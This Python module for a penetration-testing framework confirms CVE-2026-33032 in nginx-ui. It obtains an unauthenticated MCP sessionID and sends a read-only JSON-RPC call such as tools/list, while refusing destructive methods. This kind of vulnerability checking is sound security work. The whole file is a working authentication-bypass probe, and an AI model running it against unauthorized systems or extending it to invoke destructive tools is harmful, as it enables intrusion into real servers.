#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-33032 — nginx-ui unauthenticated MCP tools/list (safe confirmation)."""

import json
import re
import socket
import ssl
import time
import uuid
from typing import Optional
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client

# Only allow read-only JSON-RPC methods (refuse tool invocations).
_ALLOWED_METHODS = frozenset(
    {
        "tools/list",
        "tools/list_changed",
        "resources/list",
        "resources/templates/list",
        "prompts/list",
        "initialize",
        "ping",
    }
)


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "nginx-ui CVE-2026-33032 MCP auth bypass (tools/list)",
        "description": (
            "Confirms CVE-2026-33032 by obtaining an unauthenticated MCP sessionID and "
            "calling a read-only JSON-RPC method (default tools/list) on /mcp_message. "
            "Refuses destructive MCP tool calls (nginx_reload, config edits, etc.)."
        ),
        "author": ["Yotam Perkal", "KittySploit Team"],
        "cve": ["CVE-2026-33032"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-33032",
            "https://www.rapid7.com/blog/post/etr-cve-2026-33032-nginx-ui-missing-mcp-authentication/",
            "https://github.com/keraattin/CVE-2026-33032",
        ],
        "tags": [
            "nginx-ui",
            "mcp",
            "auth-bypass",
            "cve-2026-33032",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["nginx-ui", "nginx"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/mcp_message"],
                "param_any": ["sessionID"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "mcp"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(9000, "nginx-ui HTTP port (default 9000)", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    mcp_method = OptString(
        "tools/list",
        "Read-only JSON-RPC method (tools/list, resources/list, initialize, ping)",
        required=False,
    )
    sse_timeout = OptInteger(5, "Seconds to wait for MCP SSE sessionID", required=False, advanced=True)

    _SESSION_RE = re.compile(r"sessionI[Dd]=([A-Za-z0-9_\-]+)")
    _ENDPOINT_RE = re.compile(r"/mcp_message\?sessionI[Dd]=([A-Za-z0-9_\-]+)")

    def _timeout(self) -> int:
        return max(int(self.timeout or 10), 5)

    def _host(self) -> str:
        if hasattr(self.target, "value"):
            return str(self.target.value or "").strip()
        return str(self.target or "").strip()

    def _find_session_id(self, text: str) -> Optional[str]:
        match = self._ENDPOINT_RE.search(text or "")
        if match:
            return match.group(1)
        match = self._SESSION_RE.search(text or "")
        return match.group(1) if match else None

    def _sse_session(self) -> Optional[str]:
        response = self.http_request(
            method="GET",
            path="/mcp",
            headers={"Accept": "text/event-stream", "Cache-Control": "no-cache"},
            timeout=max(int(self.sse_timeout or 5), 3),
            allow_redirects=False,
            stream=True,
        )
        if response:
            try:
                buffered = ""
                if hasattr(response, "iter_content"):
                    deadline = time.time() + max(int(self.sse_timeout or 5), 3)
                    for chunk in response.iter_content(chunk_size=4096, decode_unicode=True):
                        if chunk:
                            buffered += (
                                chunk
                                if isinstance(chunk, str)
                                else chunk.decode("utf-8", errors="replace")
                            )
                            sid = self._find_session_id(buffered)
                            if sid:
                                return sid
                        if time.time() >= deadline:
                            break
                else:
                    buffered = response.text or ""
                sid = self._find_session_id(buffered)
                if sid:
                    return sid
            except Exception:
                pass

        # Raw socket fallback
        host = self._host()
        port = int(self.port)
        use_ssl = bool(self.ssl.value) if hasattr(self.ssl, "value") else bool(self.ssl)
        try:
            raw = socket.create_connection((host, port), timeout=self._timeout())
        except Exception:
            return None
        sock = raw
        try:
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(raw, server_hostname=host)
            sock.settimeout(max(int(self.sse_timeout or 5), 3))
            sock.sendall(
                (
                    f"GET /mcp HTTP/1.1\r\nHost: {host}:{port}\r\n"
                    f"Accept: text/event-stream\r\nConnection: close\r\n\r\n"
                ).encode("ascii")
            )
            buffered = b""
            deadline = time.time() + max(int(self.sse_timeout or 5), 3)
            while time.time() < deadline:
                try:
                    chunk = sock.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                buffered += chunk
                sid = self._find_session_id(buffered.decode("utf-8", errors="replace"))
                if sid:
                    return sid
        finally:
            try:
                sock.close()
            except Exception:
                pass
        return self._find_session_id(buffered.decode("utf-8", errors="replace"))

    def run(self):
        method = str(self.mcp_method or "tools/list").strip()
        if method not in _ALLOWED_METHODS:
            print_error(
                f"Refusing method '{method}' — only read-only MCP methods allowed: "
                + ", ".join(sorted(_ALLOWED_METHODS))
            )
            return False

        print_status("CVE-2026-33032 — nginx-ui unauthenticated MCP probe (safe)")
        print_info(f"Target: {self.target}:{int(self.port)} method={method}")

        session_id = self._sse_session()
        if not session_id:
            print_error("Could not obtain unauthenticated MCP sessionID from /mcp")
            return False
        print_success(f"sessionID={session_id}")

        payload = {
            "jsonrpc": "2.0",
            "id": str(uuid.uuid4()),
            "method": method,
            "params": {},
        }
        response = self.http_request(
            method="POST",
            path=f"/mcp_message?sessionID={quote(session_id)}",
            json=payload,
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json, text/event-stream",
            },
            timeout=self._timeout(),
            allow_redirects=False,
        )
        if not response:
            print_error("No response from /mcp_message")
            return False

        if response.status_code in (401, 403):
            print_error(f"/mcp_message auth-gated (HTTP {response.status_code}) — likely patched")
            return False

        text = response.text or ""
        print_status(f"HTTP {response.status_code}")
        try:
            data = response.json()
            pretty = json.dumps(data, indent=2)[:4000]
            print_info(pretty)
            if response.status_code == 200 and (
                "result" in data or "tools" in text.lower()
            ):
                print_success("Unauthenticated MCP JSON-RPC succeeded — vulnerable")
                return True
        except Exception:
            print_info(text[:2000])
            if response.status_code == 200 and (
                "tools" in text.lower() or '"result"' in text.lower()
            ):
                print_success("Unauthenticated MCP response looks successful — vulnerable")
                return True

        print_warning("Response inconclusive")
        return False
